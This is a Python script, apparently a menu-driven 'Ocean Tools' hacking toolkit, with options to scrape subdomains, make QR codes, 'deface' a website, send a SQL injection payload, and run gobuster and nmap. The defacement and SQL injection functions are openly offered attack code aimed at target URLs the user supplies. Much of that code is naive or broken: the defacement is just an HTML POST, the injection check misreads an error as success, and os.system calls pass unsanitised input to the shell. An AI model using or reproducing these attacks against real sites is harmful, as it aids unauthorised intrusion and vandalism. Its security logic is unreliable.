import os
import requests
from bs4 import BeautifulSoup
from pyfiglet import figlet_format

def find_subdomains(url):
    # Send a GET request to the URL
    response = requests.get(url)
    
    # Check if the request was successful
    if response.status_code == 200:
        # Parse the HTML content using BeautifulSoup
        soup = BeautifulSoup(response.content, 'html.parser')
        
        # Find all links in the page
        links = soup.find_all('a')
        
        # Create a set to store unique subdomains
        subdomains = set()
        
        # Iterate through the links
        for link in links:
            href = link.get('href')
            if href and '//' in href and '/' in href:
                # Extract the subdomain from the link
                subdomain = href.split('//')[1].split('/')[0]
                subdomains.add(subdomain)
        
        # Convert the set to a list and return the subdomains
        return list(subdomains)
    else:
        # If the request was not successful, return an empty list
        return []

def generate_qr_code(data):
    # Generate the QR code using the 'qrcode' library
    import qrcode
    qr = qrcode.QRCode(version=1, box_size=10, border=5)
    qr.add_data(data)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    img.save("qrcode.png")
    print("QR code generated successfully.")

def deface_website(url):
    # Define the HTML template for defacing
    deface_template = '''
    <html>
        <head>
            <title>Defaced Website</title>
        </head>
        <body>
            <h1>This website has been defaced!</h1>
            <p>Please do not use this website for any purpose.</p>
        </body>
    </html>
    '''
    
    # Send a POST request to the URL with the deface template
    response = requests.post(url, data=deface_template)
    
    # Check if the request was successful
    if response.status_code == 200:
        print("Website defaced successfully.")
    else:
        print("Failed to deface the website.")

def perform_sql_injection(url):
    # Define the SQL injection payload
    sql_payload = "' OR 1=1--"
    
    # Send a GET request with the SQL injection payload
    response = requests.get(url + sql_payload)
    
    # Check if the SQL injection was successful
    if "SQL syntax" in response.text:
        print("SQL injection successful.")
    else:
        print("SQL injection unsuccessful.")

def gobuster_scan(url, wordlist_path):
    # Run GoBuster scan on the URL
    os.system(f"gobuster dir -u {url} -w {wordlist_path}")

def nmap_scan(target):
    # Run Nmap scan on the target
    os.system(f"nmap {target}")

def main_menu():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(figlet_format("Ocean Tools"))
    print("1. Find All Subdomains")
    print("2. Generate QR Code")
    print("3. Deface Website")
    print("4. Perform SQL Injection")
    print("5. Run GoBuster Scan")
    print("6. Run Nmap Scan")
    print("7. Exit")
    choice = input("Enter your choice (1-7): ")
    return choice

def main():
    while True:
        choice = main_menu()
        if choice == '1':
            website_url = input("Enter the website URL: ")
            subdomains = find_subdomains(website_url)
            print(f"Subdomains: {subdomains}")
            input("Press Enter to continue...")
        elif choice == '2':
            data = input("Enter the data to encode: ")
            generate_qr_code(data)
            input("Press Enter to continue...")
        elif choice == '3':
            website_url = input("Enter the website URL to deface: ")
            deface_website(website_url)
            input("Press Enter to continue...")
        elif choice == '4':
            url = input("Enter the URL to perform SQL injection: ")
            perform_sql_injection(url)
            input("Press Enter to continue...")
        elif choice == '5':
            url = input("Enter the URL to scan: ")
            wordlist_path = input("Enter the path to the wordlist: ")
            gobuster_scan(url, wordlist_path)
            input("Press Enter to continue...")
        elif choice == '6':
            target = input("Enter the target to scan: ")
            nmap_scan(target)
            input("Press Enter to continue...")
        elif choice == '7':
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please try again.")
            input("Press Enter to continue...")

if __name__ == '__main__':
    main()